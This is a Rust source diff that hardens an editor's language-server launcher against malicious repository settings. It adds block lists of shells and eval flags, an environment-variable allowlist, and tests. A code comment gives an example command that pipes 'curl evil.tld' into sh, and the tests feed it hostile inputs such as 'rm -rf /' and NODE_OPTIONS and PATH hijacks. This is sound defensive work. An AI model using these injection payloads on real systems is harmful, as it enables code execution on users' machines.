@@ -1,4 +1,5 @@
 use std::collections::HashMap;
+use std::ffi::OsString;
 use std::io::{BufRead, BufReader, BufWriter, Write};
 use std::path::{Path, PathBuf};
 use std::process::{Child, Command, Stdio};
@@ -71,7 +72,7 @@ pub(crate) struct LspClient {
 /// Read and log stderr lines from an LSP server process.
 fn drain_stderr(name: String, stderr: ChildStderr) {
     let reader = BufReader::new(stderr);
-    for line in reader.lines() {
+    for line in crate::ai_process::bounded_lines(reader) {
         match line {
             Ok(l) => log::debug!("[lsp:{}:stderr] {}", name, l),
             Err(_) => break,
@@ -107,7 +108,24 @@ fn drain_stdout(name: String, stdout: std::process::ChildStdout, tx: mpsc::Sende
     }
 }
 
-#[allow(dead_code)]
+/// Best-effort SIGKILL to a child's whole process group.
+///
+/// Language servers are spawned in their own group (see `spawn_server`), so a
+/// negative pid reaches the helpers they fork as well as the server itself.
+#[cfg(unix)]
+fn kill_process_group(pid: u32) {
+    let Ok(pid) = libc::pid_t::try_from(pid) else {
+        return;
+    };
+    // SAFETY: a plain signal syscall; an invalid pid just returns ESRCH.
+    unsafe {
+        libc::kill(-pid, libc::SIGKILL);
+    }
+}
+
+#[cfg(not(unix))]
+fn kill_process_group(_pid: u32) {}
+
 impl LspClient {
     /// Spawn a language server process and start the reader thread.
     /// Does NOT send `initialize` yet — call `initialize()` after construction.
@@ -119,6 +137,27 @@ impl LspClient {
         root: &Path,
         shell_init: &str,
     ) -> Result<Self, String> {
+        // `command`, `args` and `env` all come from settings.json, which may
+        // ship with a cloned repository. Validate every one of them before a
+        // process exists — see `is_safe_command_name` / `is_safe_arg`.
+        if !is_safe_command_name(command) {
+            let msg = format!(
+                "refusing to start LSP server '{}': unsafe command {:?}",
+                name, command
+            );
+            log::warn!("[lsp] {}", msg);
+            return Err(msg);
+        }
+        if let Some(bad) = args.iter().find(|a| !is_safe_arg(a)) {
+            let msg = format!(
+                "refusing to start LSP server '{}': argument {:?} makes the program \
+                 execute an argument as code",
+                name, bad
+            );
+            log::warn!("[lsp] {}", msg);
+            return Err(msg);
+        }
+
         // Resolve command path via shell (handles GUI-app PATH issues on macOS).
         let resolved_cmd = resolve_command(command, shell_init)
             .ok_or_else(|| format!("LSP server '{}' not found: {}", name, command))?;
@@ -129,6 +168,22 @@ impl LspClient {
             .stdin(Stdio::piped())
             .stdout(Stdio::piped())
             .stderr(Stdio::piped());
+
+        // Own process group, so `kill` can take down the helpers a server
+        // forks (rust-analyzer's proc-macro server, tsserver workers) instead
+        // of orphaning them — and so the group-kill can never reach anything
+        // outside this server.
+        #[cfg(unix)]
+        {
+            use std::os::unix::process::CommandExt;
+            cmd.process_group(0);
+        }
+
+        // `PATH` is Dirigent's, never the repository's — see `composed_path`.
+        // Set before the settings loop so nothing can be layered on top of it.
+        if let Some(path) = composed_path(&resolved_cmd) {
+            cmd.env("PATH", path);
+        }
 
         // Apply environment variables.
         // Split on newlines to handle legacy entries where multiple KEY=VALUE
@@ -145,12 +200,15 @@ impl LspClient {
                     // because settings.json may be attacker-controlled (a malicious
                     // `.Dirigent/settings.json` in a repo). The `env` field is the
                     // same trust boundary: without this check it silently bypasses
-                    // that protection, since a dynamic-linker variable injects a
-                    // shared library into the (otherwise trusted) server process —
-                    // arbitrary code execution the moment the server spawns.
+                    // that protection, since one interpreter hook (`NODE_OPTIONS`,
+                    // `PYTHONSTARTUP`, `RUBYOPT`, `LD_PRELOAD`, ...) is arbitrary
+                    // code execution the moment the server spawns. Only names on
+                    // the `SAFE_ENV_NAMES` allowlist get through.
                     if !is_safe_env_name(k) {
                         log::warn!(
-                            "[lsp] refusing to set unsafe environment variable {:?} for server '{}'",
+                            "[lsp] refusing to set environment variable {:?} for server '{}': \
+                             not on the allowlist of variables that cannot influence what \
+                             the server loads or executes",
                             k,
                             name
                         );
@@ -433,10 +491,19 @@ impl LspClient {
     }
 
     /// Kill the server process.
+    /// Kill the language server and reap it.
+    ///
+    /// The `wait()` matters: `kill()` alone leaves a zombie in the process
+    /// table for the lifetime of the GUI, and nothing else collects it —
+    /// `is_alive`'s `try_wait` races the signal and usually reports `None`.
+    /// Language servers routinely spawn helpers (rust-analyzer's proc-macro
+    /// server, tsserver workers), so the whole process group is signalled.
     pub fn kill(&self) {
         if let Ok(mut guard) = self.process.lock() {
             if let Some(ref mut child) = *guard {
+                kill_process_group(child.id());
                 let _ = child.kill();
+                let _ = child.wait();
             }
         }
     }
@@ -508,11 +575,26 @@ impl Drop for LspClient {
     }
 }
 
+/// Largest LSP message body Dirigent will allocate for.
+///
+/// `Content-Length` is supplied by the language server, so allocating it
+/// directly hands a buggy or hostile server an arbitrary-allocation primitive
+/// (`Content-Length: 999999999999`). Real payloads are hover text, completion
+/// lists and diagnostics; 64 MiB is generous for all of them.
+const MAX_LSP_BODY_BYTES: usize = 64 * 1024 * 1024;
+
+/// Largest header block accepted before a message body.
+///
+/// Bounds the other half of the framing: a server that never emits the blank
+/// separator line would otherwise loop forever accumulating headers.
+const MAX_LSP_HEADER_BYTES: usize = 64 * 1024;
+
 /// Read a single LSP JSON-RPC message from the stream.
 /// Returns None on EOF.
 fn read_lsp_message<R: BufRead>(reader: &mut R) -> Result<Option<LspMessage>, String> {
     // Read headers
     let mut content_length: Option<usize> = None;
+    let mut header_bytes = 0usize;
     loop {
         let mut header_line = String::new();
         let bytes_read = reader
@@ -520,6 +602,12 @@ fn read_lsp_message<R: BufRead>(reader: &mut R) -> Result<Option<LspMessage>, St
             .map_err(|e| e.to_string())?;
         if bytes_read == 0 {
             return Ok(None); // EOF
+        }
+        header_bytes += bytes_read;
+        if header_bytes > MAX_LSP_HEADER_BYTES {
+            return Err(format!(
+                "LSP header block exceeds {MAX_LSP_HEADER_BYTES} bytes — dropping connection"
+            ));
         }
         let trimmed = header_line.trim();
         if trimmed.is_empty() {
@@ -531,6 +619,11 @@ fn read_lsp_message<R: BufRead>(reader: &mut R) -> Result<Option<LspMessage>, St
     }
 
     let length = content_length.ok_or("Missing Content-Length header")?;
+    if length > MAX_LSP_BODY_BYTES {
+        return Err(format!(
+            "LSP message body of {length} bytes exceeds the {MAX_LSP_BODY_BYTES} byte limit"
+        ));
+    }
 
     // Read body
     let mut body = vec![0u8; length];
@@ -573,28 +666,238 @@ fn read_lsp_message<R: BufRead>(reader: &mut R) -> Result<Option<LspMessage>, St
     }
 }
 
-/// Returns `true` if `name` contains only characters safe for shell interpolation
-/// (alphanumeric, hyphen, underscore, dot, forward slash).
-/// Rejects shell metacharacters like `;`, `|`, `$`, backtick, etc.
-fn is_safe_command_name(name: &str) -> bool {
-    !name.is_empty()
-        && name
-            .chars()
-            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/'))
+/// Programs that run code handed to them as an argument: shells, interpreters,
+/// and the wrappers (`env`, `xargs`, `nohup`, ...) that exist to launch them.
+///
+/// Character-level validation of `command` alone is not enough, because `args`
+/// is passed to the process verbatim and comes from the same file. A repository
+/// shipping `{"lsp_enabled": true, "lsp_servers": [{"command": "/bin/sh",
+/// "args": ["-c", "curl evil.tld|sh"]}]}` would otherwise execute arbitrary
+/// code the moment it is opened — `start_servers` runs from `DirigentApp::new`,
+/// with no user interaction. A language server is always a long-lived binary
+/// speaking JSON-RPC over stdio, never an interpreter invocation, so refusing
+/// these names costs nothing legitimate.
+const CODE_EXECUTING_PROGRAMS: &[&str] = &[
+    // Shells.
+    "sh",
+    "bash",
+    "zsh",
+    "dash",
+    "ksh",
+    "mksh",
+    "csh",
+    "tcsh",
+    "fish",
+    "ash",
+    "busybox",
+    "pwsh",
+    "powershell",
+    // Wrappers whose whole job is to exec whatever they are handed.
+    "env",
+    "xargs",
+    "nohup",
+    "setsid",
+    "stdbuf",
+    "nice",
+    "timeout",
+    "script",
+    "sudo",
+    "doas",
+    "open",
+    // Interpreters and language runtimes.
+    "node",
+    "nodejs",
+    "deno",
+    "bun",
+    "python",
+    "pypy",
+    "ruby",
+    "perl",
+    "php",
+    "lua",
+    "luajit",
+    "tclsh",
+    "wish",
+    "osascript",
+    "awk",
+    "gawk",
+    "mawk",
+    "nawk",
+    "sed",
+    "groovy",
+    "scala",
+    "jshell",
+    "irb",
+    "elixir",
+    "iex",
+    "erl",
+    "escript",
+    "java",
+    "swift",
+    "ghci",
+    "runghc",
+    "runhaskell",
+    "rscript",
+    "r",
+    "julia",
+    "guile",
+    "emacs",
+    "vim",
+];
+
+/// Flags that make a program treat an argument as code rather than data.
+///
+/// Second line of defence behind [`CODE_EXECUTING_PROGRAMS`]: it catches an
+/// interpreter that reaches `spawn` under a name not on that list (a wrapper
+/// script, a vendored binary, a language runtime we did not enumerate).
+/// Real language servers take flags like `--stdio`, `--languageserver` or a
+/// data directory — never an eval flag.
+const CODE_EXECUTING_FLAGS: &[&str] = &[
+    "-c",     // sh/bash/zsh/python/ruby/php: run the next argument
+    "-e",     // perl/ruby/node/sed: evaluate
+    "-E",     // perl: evaluate with features enabled
+    "--eval", // node/deno/bun/php/emacs
+    "--eval-file",
+    "--execute",
+    "-execute",
+    "--exec",
+    "-exec", // find(1)
+    "--command",
+    "-command",
+    "--expression",
+    "-expression",
+];
+
+/// The lowercased program name a command path refers to
+/// (`/usr/bin/python3.12` -> `python3.12`).
+fn program_basename(command: &str) -> String {
+    Path::new(command)
+        .file_name()
+        .map(|n| n.to_string_lossy().to_ascii_lowercase())
+        .unwrap_or_default()
 }
 
-/// Returns `true` if `name` is a safe environment variable to set for a spawned
-/// language server.
+/// Returns `true` if `name` is safe to spawn as a language server.
 ///
-/// Rejects the dynamic-linker variables (`DYLD_*` on macOS, `LD_*` on Linux —
-/// e.g. `DYLD_INSERT_LIBRARIES`, `LD_PRELOAD`, `LD_AUDIT`, `LD_LIBRARY_PATH`)
-/// that let an attacker-controlled `.Dirigent/settings.json` load a shared
-/// library into the server process, which is remote code execution. The
-/// `command` field is already guarded by [`is_safe_command_name`]; this closes
-/// the equivalent hole in the `env` field.
+/// Two rules, both required:
+/// 1. Only characters safe for shell interpolation (alphanumeric, hyphen,
+///    underscore, dot, forward slash) — rejects `;`, `|`, `$`, backtick, etc.,
+///    since [`resolve_command`] falls back to a login-shell `which`.
+/// 2. The program is not a shell, interpreter, or exec wrapper
+///    ([`CODE_EXECUTING_PROGRAMS`]), which would turn `args` into a
+///    code-execution channel.
+fn is_safe_command_name(name: &str) -> bool {
+    if name.is_empty()
+        || !name
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/'))
+    {
+        return false;
+    }
+    let base = program_basename(name);
+    // Also compare without a trailing version suffix, so `python3.12` and
+    // `perl5.34` are caught by the `python` / `perl` entries.
+    let unversioned = base.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
+    !CODE_EXECUTING_PROGRAMS
+        .iter()
+        .any(|p| *p == base || *p == unversioned)
+}
+
+/// Returns `true` if `arg` is safe to pass to a language server process.
+///
+/// Rejects eval-style flags in both spellings a program may accept them in
+/// (`--eval CODE` and `--eval=CODE`).
+fn is_safe_arg(arg: &str) -> bool {
+    let flag = arg.split('=').next().unwrap_or(arg);
+    !CODE_EXECUTING_FLAGS.contains(&flag)
+}
+
+/// Environment variables a language server may be given from settings.
+///
+/// This is an allowlist, and it must stay one. Blocking the names that are
+/// known to be dangerous does not work: far too many variables are an
+/// arbitrary-code hook for some runtime, and the servers Dirigent ships
+/// presets for are written in exactly the languages that have them —
+/// `NODE_OPTIONS=--require /repo/evil.js` (typescript-language-server),
+/// `PYTHONSTARTUP` / `PYTHONPATH` (pylsp, pyright), `RUBYOPT` (solargraph),
+/// `PERL5OPT`, `BASH_ENV` / `ENV` for anything that shells out,
+/// `GIT_SSH_COMMAND` for anything that runs `git`, and the dynamic-linker
+/// variables (`DYLD_*`, `LD_*`) for everything. `PATH` is worse still: it
+/// redirects every binary the server itself spawns, so it is composed by
+/// Dirigent (see [`composed_path`]) and never taken from settings.
+///
+/// Entries below are limited to locale, terminal presentation, log verbosity
+/// and pure data/cache directories. A name belongs here only if its value can
+/// never be interpreted as code, a library to load, or a program to run —
+/// which rules out toolchain selectors (`JAVA_HOME`, `RUSTUP_TOOLCHAIN`,
+/// `VIRTUAL_ENV`), wrapper hooks (`RUSTC_WRAPPER`, `GOFLAGS`) and anything
+/// that redirects a download (`GOPROXY`, `*_PROXY`).
+const SAFE_ENV_NAMES: &[&str] = &[
+    // Locale and terminal presentation.
+    "LANG",
+    "LANGUAGE",
+    "LC_ALL",
+    "LC_CTYPE",
+    "LC_MESSAGES",
+    "LC_NUMERIC",
+    "LC_TIME",
+    "TZ",
+    "TERM",
+    "COLUMNS",
+    "LINES",
+    // Colour toggles.
+    "NO_COLOR",
+    "CLICOLOR",
+    "CLICOLOR_FORCE",
+    "FORCE_COLOR",
+    // Log verbosity knobs understood by various servers.
+    "LOG_LEVEL",
+    "LOGLEVEL",
+    "LSP_LOG_LEVEL",
+    "RUST_LOG",
+    "RUST_BACKTRACE",
+    "RA_LOG",
+    // Data and cache directories (contents are read, never executed).
+    "CARGO_TARGET_DIR",
+    "GOPATH",
+    "GOCACHE",
+    "GOMODCACHE",
+    "GO111MODULE",
+];
+
+/// Returns `true` if `name` may be set from settings for a spawned language
+/// server — that is, if it is on the [`SAFE_ENV_NAMES`] allowlist.
+///
+/// The match is exact. Case-insensitive matching would let `path` through on
+/// platforms where the environment is case-insensitive, and a lowercase
+/// spelling of an allowlisted name is not read by anything anyway.
 fn is_safe_env_name(name: &str) -> bool {
-    let upper = name.to_ascii_uppercase();
-    !(upper.starts_with("DYLD_") || upper.starts_with("LD_"))
+    SAFE_ENV_NAMES.contains(&name)
+}
+
+/// Build the `PATH` for a spawned language server.
+///
+/// Composed by Dirigent rather than taken from settings: `PATH` decides which
+/// binary every process the server spawns resolves to (`gopls` runs `go`,
+/// solargraph runs `ruby`, jdtls runs `java`), so accepting it from a
+/// repository's `.Dirigent/settings.json` is arbitrary code execution with
+/// extra steps. Dirigent's own `PATH` is used, with the directory the server
+/// binary was resolved from in front so a toolchain-local server finds its
+/// siblings first.
+fn composed_path(resolved_cmd: &str) -> Option<OsString> {
+    let inherited = std::env::var_os("PATH").unwrap_or_default();
+    let mut dirs: Vec<PathBuf> = Vec::new();
+    if let Some(parent) = Path::new(resolved_cmd).parent() {
+        if !parent.as_os_str().is_empty() {
+            dirs.push(parent.to_path_buf());
+        }
+    }
+    for dir in std::env::split_paths(&inherited) {
+        if !dirs.contains(&dir) {
+            dirs.push(dir);
+        }
+    }
+    std::env::join_paths(dirs).ok()
 }
 
 /// Resolve a command name using the login shell (handles macOS GUI PATH issues).
@@ -694,7 +997,7 @@ fn language_id_from_path(path: &Path) -> String {
 
 #[cfg(test)]
 mod tests {
-    use super::{is_safe_command_name, is_safe_env_name};
+    use super::{is_safe_arg, is_safe_command_name, is_safe_env_name, LspClient};
 
     #[test]
     fn rejects_command_names_with_shell_metacharacters() {
@@ -704,6 +1007,124 @@ mod tests {
         assert!(!is_safe_command_name("evil;rm -rf /"));
         assert!(!is_safe_command_name("$(payload)"));
         assert!(!is_safe_command_name(""));
+    }
+
+    #[test]
+    fn rejects_shells_and_interpreters_as_the_command() {
+        // These pass the character allowlist but execute whatever `args` says,
+        // so permitting them makes `args` a code-execution channel.
+        for evil in [
+            "/bin/sh",
+            "sh",
+            "bash",
+            "/bin/zsh",
+            "/usr/bin/env",
+            "node",
+            "python3",
+            "/usr/bin/python3.12",
+            "perl5.34",
+            "ruby",
+            "php",
+            "osascript",
+            "java",
+            "xargs",
+            "nohup",
+            "/usr/bin/open",
+        ] {
+            assert!(!is_safe_command_name(evil), "{evil} must be rejected");
+        }
+
+        // Real language servers must keep working.
+        for ok in [
+            "rust-analyzer",
+            "clangd",
+            "gopls",
+            "pylsp",
+            "typescript-language-server",
+            "lua-language-server",
+            "elixir-ls",
+            "sourcekit-lsp",
+            "OmniSharp",
+            "zls",
+            "/opt/homebrew/bin/jdtls",
+        ] {
+            assert!(is_safe_command_name(ok), "{ok} must be allowed");
+        }
+    }
+
+    #[test]
+    fn rejects_arguments_that_execute_code() {
+        for evil in [
+            "-c",
+            "-e",
+            "-E",
+            "--eval",
+            "--eval=1+1",
+            "--eval-file",
+            "-exec",
+            "--exec=payload",
+            "--command",
+            "-command",
+            "--expression",
+        ] {
+            assert!(!is_safe_arg(evil), "{evil} must be rejected");
+        }
+
+        // Ordinary language server arguments.
+        for ok in [
+            "--stdio",
+            "stdio",
+            "--languageserver",
+            "--log-level=debug",
+            "-data",
+            "/Users/me/.cache/jdtls",
+            "--clang-tidy",
+            "",
+        ] {
+            assert!(is_safe_arg(ok), "{ok:?} must be allowed");
+        }
+    }
+
+    #[test]
+    fn spawn_refuses_the_shell_payload_without_running_it() {
+        // End-to-end regression for the startup RCE: a cloned repository whose
+        // `.Dirigent/settings.json` sets `{"command": "/bin/sh", "args":
+        // ["-c", "..."]}` must not get a process, since `start_servers` runs
+        // from `DirigentApp::new()` with no user interaction.
+        let dir = tempfile::tempdir().unwrap();
+        let canary = dir.path().join("pwned");
+        let payload = format!("touch {}", canary.display());
+
+        let Err(err) = LspClient::spawn(
+            "evil",
+            "/bin/sh",
+            &["-c".to_string(), payload.clone()],
+            &[],
+            dir.path(),
+            "",
+        ) else {
+            panic!("spawning /bin/sh must be refused");
+        };
+        assert!(err.contains("unsafe command"), "unexpected error: {err}");
+        assert!(!canary.exists(), "payload ran");
+
+        // And again with a command that is not itself a shell, to prove the
+        // argument check is a second, independent gate.
+        let Err(err) = LspClient::spawn(
+            "evil",
+            "rust-analyzer",
+            &["-c".to_string(), payload],
+            &[],
+            dir.path(),
+            "",
+        ) else {
+            panic!("an eval-style argument must be refused");
+        };
+        assert!(
+            err.contains("execute an argument"),
+            "unexpected error: {err}"
+        );
+        assert!(!canary.exists(), "payload ran");
     }
 
     #[test]
@@ -719,10 +1140,130 @@ mod tests {
     }
 
     #[test]
+    fn rejects_interpreter_hook_env_vars() {
+        // Every one of these makes a runtime execute a file named by the
+        // variable, and each targets a language Dirigent ships an LSP preset
+        // for. A blocklist of `DYLD_*` / `LD_*` let all of them through.
+        for evil in [
+            // Node — typescript-language-server, and any node-based server.
+            "NODE_OPTIONS",
+            "NODE_REPL_EXTERNAL_MODULE",
+            "NODE_EXTRA_CA_CERTS",
+            // Python — pylsp, pyright.
+            "PYTHONSTARTUP",
+            "PYTHONPATH",
+            "PYTHONHOME",
+            "PYTHONEXECUTABLE",
+            // Ruby — solargraph.
+            "RUBYOPT",
+            "RUBYLIB",
+            // Perl.
+            "PERL5OPT",
+            "PERL5LIB",
+            // Shell hooks, for any server that shells out.
+            "BASH_ENV",
+            "ENV",
+            "SHELLOPTS",
+            "ZDOTDIR",
+            // Anything that runs `git`.
+            "GIT_SSH_COMMAND",
+            "GIT_EXTERNAL_DIFF",
+            "GIT_PAGER",
+            // Toolchain selectors: point at a directory with a fake binary.
+            "JAVA_HOME",
+            "JAVA_TOOL_OPTIONS",
+            "RUSTUP_TOOLCHAIN",
+            "RUSTC_WRAPPER",
+            "VIRTUAL_ENV",
+            "GOFLAGS",
+            "GOPROXY",
+        ] {
+            assert!(!is_safe_env_name(evil), "{evil} must be rejected");
+        }
+    }
+
+    #[test]
+    fn rejects_path_from_settings() {
+        // PATH redirects every binary the server itself spawns (gopls -> go,
+        // solargraph -> ruby, jdtls -> java). Dirigent composes it instead.
+        assert!(!is_safe_env_name("PATH"));
+        assert!(!is_safe_env_name("path"));
+        assert!(!is_safe_env_name("Path"));
+    }
+
+    #[test]
     fn allows_ordinary_env_vars() {
         assert!(is_safe_env_name("RUST_LOG"));
+        assert!(is_safe_env_name("RUST_BACKTRACE"));
         assert!(is_safe_env_name("GOPATH"));
-        assert!(is_safe_env_name("PYTHONPATH"));
-        assert!(is_safe_env_name("PATH"));
+        assert!(is_safe_env_name("LANG"));
+        assert!(is_safe_env_name("NO_COLOR"));
+        assert!(is_safe_env_name("LOG_LEVEL"));
+    }
+
+    #[test]
+    fn allowlist_matches_exactly() {
+        // No prefix or substring matching: `RUST_LOG` being allowed must not
+        // admit `RUST_LOG_STYLE_EVIL`, and no casing trick may get PATH in.
+        assert!(!is_safe_env_name("RUST_LOG_EXTRA"));
+        assert!(!is_safe_env_name("MY_RUST_LOG"));
+        assert!(!is_safe_env_name("rust_log"));
+        assert!(!is_safe_env_name(""));
+    }
+
+    #[test]
+    fn composed_path_is_dirigents_own_with_the_server_dir_first() {
+        let path =
+            super::composed_path("/opt/toolchain/bin/rust-analyzer").expect("PATH should compose");
+        let dirs: Vec<_> = std::env::split_paths(&path).collect();
+        assert_eq!(
+            dirs.first().map(|p| p.as_path()),
+            Some(std::path::Path::new("/opt/toolchain/bin")),
+            "the resolved server's directory must come first"
+        );
+        // The rest is the inherited PATH, not anything from settings.
+        for inherited in std::env::split_paths(&std::env::var_os("PATH").unwrap_or_default()) {
+            assert!(
+                dirs.contains(&inherited),
+                "inherited PATH entry {inherited:?} must be preserved"
+            );
+        }
+        // And no duplicate entry for a directory already on PATH.
+        let mut sorted = dirs.clone();
+        sorted.sort();
+        sorted.dedup();
+        assert_eq!(sorted.len(), dirs.len(), "PATH must not contain duplicates");
+    }
+
+    #[test]
+    fn spawn_ignores_interpreter_hooks_from_settings() {
+        // End-to-end: a repository's settings.json cannot hand a hook variable
+        // to a server. `rust-analyzer` is unlikely to exist in CI, so assert on
+        // the failure mode being "binary not found" — never a spawn that
+        // carried the payload.
+        let dir = tempfile::tempdir().unwrap();
+        let canary = dir.path().join("pwned");
+        let env = vec![
+            format!("NODE_OPTIONS=--require {}", canary.display()),
+            format!("PYTHONSTARTUP={}", canary.display()),
+            "PATH=/tmp/evil/bin".to_string(),
+            "RUST_LOG=debug".to_string(),
+        ];
+
+        let result = LspClient::spawn(
+            "typescript-language-server",
+            "typescript-language-server",
+            &["--stdio".to_string()],
+            &env,
+            dir.path(),
+            "",
+        );
+        if let Err(err) = result {
+            assert!(
+                !err.contains("unsafe command") && !err.contains("execute an argument"),
+                "unexpected rejection: {err}"
+            );
+        }
+        assert!(!canary.exists(), "payload ran");
     }
 }
